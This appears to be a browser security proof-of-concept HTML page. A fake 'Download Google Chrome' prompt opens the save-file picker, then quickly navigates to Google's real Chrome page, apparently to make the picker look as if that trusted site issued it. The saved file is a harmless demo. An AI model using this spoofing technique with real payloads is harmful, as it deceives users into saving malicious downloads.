<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>PoC</title>
<style>
body {
    margin: 0;
    height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    font-family: Arial, sans-serif;
}
.cta {
    text-align: center;
}
</style>
</head>
<body>

<div class="cta">
    <h1>Download Google Chrome</h1>
    <p>Click anywhere to continue</p>
</div>

<script>
document.addEventListener('click', async () => {
    if (!('showSaveFilePicker' in window)) return;

    try {
        // Prepare realistic blob data (non-malicious)
        const blob = new Blob(
            ['Chrome Offline Installer\n\nThis is a demo file.'],
            { type: 'text/plain' }
        );

        // Trigger picker with realistic filename
        const pickerPromise = window.showSaveFilePicker({
            suggestedName: 'ChromeSetup.txt',
            types: [{
                description: 'Text File',
                accept: { 'text/plain': ['.txt'] }
            }]
        });

        // Navigate shortly AFTER picker is visible
        setTimeout(() => {
            window.location.href = 'https://www.google.com/chrome/';
        }, 250);

        // Wait for user interaction with picker
        const handle = await pickerPromise;

        // Attempt write (may be dropped after navigation â€” expected)
        const writable = await handle.createWritable();
        await writable.write(blob);
        await writable.close();

    } catch (e) {
        // Abort / cancellation is expected behavior
    }
}, { once: true });
</script>

</body>
</html>
